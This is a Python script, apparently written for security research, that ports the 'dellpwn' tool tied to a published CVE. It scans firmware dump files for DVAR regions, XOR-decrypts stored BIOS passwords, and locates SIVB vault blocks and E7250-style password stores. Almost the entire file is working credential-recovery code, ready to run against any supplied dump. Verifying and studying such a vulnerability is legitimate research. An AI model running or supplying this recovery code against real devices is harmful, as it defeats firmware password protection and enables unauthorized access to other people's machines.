#!/usr/bin/env python3
"""dvar_scan_port.py — faithful Python port of dellpwn's DVAR+XOR scan.

Verifies, on our real forum-dump corpus (REPORT §13.9), the recovery
mechanism published as CVE-2026-40639 / DSA-2026-197 by AmberWolf
(Darren McDonald, @R3n5k1) and MDSec (Craig Blackie, @craigsblackie),
released as the Rust tool `dellpwn` (github.com/R3n5k1/dellpwn).

This port follows dellpwn src/dvar.rs (MIT) line-for-line for the primary
short-password path and all record filters:

  - find_dvar_region (dvar.rs:75): first "DVAR" signature, region +0x40000
  - recover_password_short (dvar.rs:87): key[0..10] from null-padded wrap
    region stored[21..31]; decrypt 1..12; find terminator (incl. DVAR
    obfuscation masks); re-extract authoritative key from stored[len..21];
    wrap-region cross-validation (<=5 mismatches); full re-decrypt; null
    region check (<=5 non-zero); 1 <= len <= 20
  - scan_for_passwords filters (dvar.rs:738): key entropy >= 8 unique,
    <= 2 zero key bytes, no byte value > 3 occurrences, <= 12 printable
    key bytes, <= 6 low-value key bytes, <= 4 zero stored bytes,
    wrap errors <= min(5, len/2+1), password length >= 3

Usage: python3 dvar_scan_port.py <dump.bin> [dump2.bin ...]
"""
import sys
from collections import Counter

OBFUSCATION_MASKS = {0x08, 0x10, 0x18, 0x20, 0x28, 0x40, 0x48}


def is_printable(b):
    return 0x20 <= b < 0x7f           # dvar.rs:17-19


def recover_password_short(stored):    # dvar.rs:87
    if len(stored) < 32:
        return None
    b0 = stored[0]
    if not is_printable(b0):
        return None
    # key[0..10] from wrap-around region (positions 21-31)
    key = [0] * 20
    for i in range(21, 32):
        key[(i - 1) % 20] = stored[i]
    # decrypt positions 1-11
    dec = [0] * 32
    dec[0] = b0
    for i in range(1, 12):
        dec[i] = stored[i] ^ key[(i - 1) % 20]
    # find null terminator within first 12 bytes (obfuscation-tolerant)
    pwd_len = 12
    for i in range(12):
        if dec[i] == 0:
            pwd_len = i
            break
        if not is_printable(dec[i]):
            if dec[i] in OBFUSCATION_MASKS:
                pwd_len = i
                break
            return None
    if pwd_len < 1:
        return None
    # authoritative key from null region
    if pwd_len <= 20:
        for i in range(pwd_len, 21):
            key[(i - 1) % 20] = stored[i]
    # cross-validate: wrap-region mismatches
    wrap_mismatches = 0
    if pwd_len < 11:
        for k in range(pwd_len, 11):
            if stored[k + 1] != key[k]:
                wrap_mismatches += 1
    for i in range(21, 32):
        if stored[i] != key[(i - 1) % 20]:
            wrap_mismatches += 1
    if wrap_mismatches > 5:
        return None
    # re-decrypt with corrected key, re-find terminator
    for i in range(1, 32):
        dec[i] = stored[i] ^ key[(i - 1) % 20]
    pwd_len = 32
    for i in range(32):
        if dec[i] == 0:
            pwd_len = i
            break
        if not is_printable(dec[i]):
            return None
    if pwd_len < 1 or pwd_len > 20:
        return None
    # verify null region
    null_nonzero = sum(1 for i in range(pwd_len + 1, 32) if dec[i] != 0)
    if null_nonzero > 5:
        return None
    return bytes(dec[:pwd_len]).decode('latin-1'), bytes(key)


def find_dvar_region(data):            # dvar.rs:75
    i = data.find(b"DVAR")
    if i < 0:
        return None
    return (i, min(i + 0x40000, len(data)))


def scan_for_passwords(data, start, end):   # dvar.rs:738
    results = []
    skip_until = 0
    scan_end = min(end, len(data) - 32)
    off = start
    while off < scan_end:
        if off < skip_until:
            off += 1
            continue
        rec = data[off:off + 32]
        r = recover_password_short(rec)
        if r:
            pw, key = r
            counts = Counter(key)
            if (len(set(key)) >= 8
                    and sum(1 for b in key if b == 0) <= 2
                    and max(counts.values()) <= 3
                    and sum(1 for b in key if is_printable(b)) <= 12
                    and sum(1 for b in key if b <= 0x0F) <= 6
                    and sum(1 for b in rec[1:] if b == 0) <= 4
                    and len(pw) >= 3):
                wrap_errors = sum(1 for i in range(21, 32)
                                  if rec[i] != key[(i - 1) % 20])
                if wrap_errors <= min(5, len(pw) // 2 + 1):
                    results.append((off, pw, key.hex()))
                    skip_until = off + 32
        off += 1
    return results


def scan_file(path):
    data = open(path, 'rb').read()
    region = find_dvar_region(data)
    if not region:
        return None, []
    return region, scan_for_passwords(data, *region)


# --- SIVB (Security Information Vault Block) — port of dellpwn sivb.rs:43 ---
SIVB_SIG = b"SIVB"
SIVB_TOTAL_SIZE = 5552          # header + data (sivb.rs:20)


def find_sivb(data):
    """dellpwn find_sivb (sivb.rs:43): locate SIVB blocks; the 4 bytes
    before the signature are a little-endian header (hash_size u16,
    blob_size u16; typical 0x20 / 0x1540). has_data = block contains
    >10 bytes that are neither 0x00 nor 0xFF."""
    results = []
    i = data.find(SIVB_SIG)
    while i >= 0 and i + 4 <= len(data):
        block_end = min(i + SIVB_TOTAL_SIZE, len(data))
        non_trivial = sum(1 for b in data[i + 4:block_end]
                          if b not in (0x00, 0xFF))
        pushed = False
        if i >= 4:
            hash_size = data[i - 4] | (data[i - 3] << 8)
            blob_size = data[i - 2] | (data[i - 1] << 8)
            if hash_size == 0x20 and blob_size > 0:
                results.append({'offset': i - 4, 'hash_size': hash_size,
                                'blob_size': blob_size,
                                'has_data': non_trivial > 10})
                pushed = True
        if not pushed:
            if not results or results[-1]['offset'] != i - 4:
                results.append({'offset': i, 'hash_size': 0,
                                'blob_size': 0,
                                'has_data': non_trivial > 10})
        i = data.find(SIVB_SIG, i + 1)
    return results


# --- E7250-style password stores — port of dellpwn sivb.rs:111 ---
def find_password_stores(data):
    """dellpwn find_password_stores (sivb.rs:111): 4KB-aligned records with
    header 06 78 F* FF 03 00 00 00 plus 0x84/0x85/0xFF markers at +0xD0/+0xE0.
    has_password = >20 non-FF bytes in the 4KB page."""
    results = []
    offset = 0
    while offset + 8 < len(data):
        if (data[offset] == 0x06 and data[offset + 1] == 0x78
                and (data[offset + 2] & 0xF0) == 0xF0
                and data[offset + 3] == 0xFF
                and data[offset + 4:offset + 8] == b'\x03\x00\x00\x00'):
            has_markers = False
            for check_off in (0xD0, 0xE0):
                if offset + check_off < len(data):
                    if data[offset + check_off] in (0x84, 0x85, 0xFF):
                        has_markers = True
            if has_markers:
                store_data = data[offset:min(offset + 0x1000, len(data))]
                non_ff = sum(1 for b in store_data if b != 0xFF)
                results.append({'offset': offset, 'non_ff_bytes': non_ff,
                                'has_password': non_ff > 20,
                                'counter': data[offset + 2]})
        offset += 0x1000
    return results


def full_scan(path):
    """dellpwn-equivalent read-only scan: DVAR passwords + SIVB blocks +
    E7250-style stores."""
    data = open(path, 'rb').read()
    out = {'size': len(data)}
    region = find_dvar_region(data)
    out['dvar'] = (region, scan_for_passwords(data, *region)) if region else None
    out['sivb'] = find_sivb(data)
    out['e7250'] = find_password_stores(data)
    return out


def main():
    for path in sys.argv[1:]:
        r = full_scan(path)
        name = path.split('/')[-1]
        print(f"{name} ({r['size']} bytes)")
        if r['dvar']:
            (s, e), pws = r['dvar']
            print(f"  DVAR store {s:#x}-{e:#x}: {len(pws)} password(s)")
            for off, pw, key in pws:
                print(f"    [{off:#x}] {pw!r}  key={key}")
        else:
            print("  DVAR store: none")
        if r['sivb']:
            for b in r['sivb']:
                print(f"  SIVB block @{b['offset']:#x} hash_size={b['hash_size']:#x}"
                      f" blob_size={b['blob_size']:#x} has_data={b['has_data']}")
        if r['e7250']:
            for b in r['e7250']:
                print(f"  E7250-style store @{b['offset']:#x} counter={b['counter']:#x}"
                      f" non_ff={b['non_ff_bytes']} has_password={b['has_password']}")


if __name__ == '__main__':
    main()
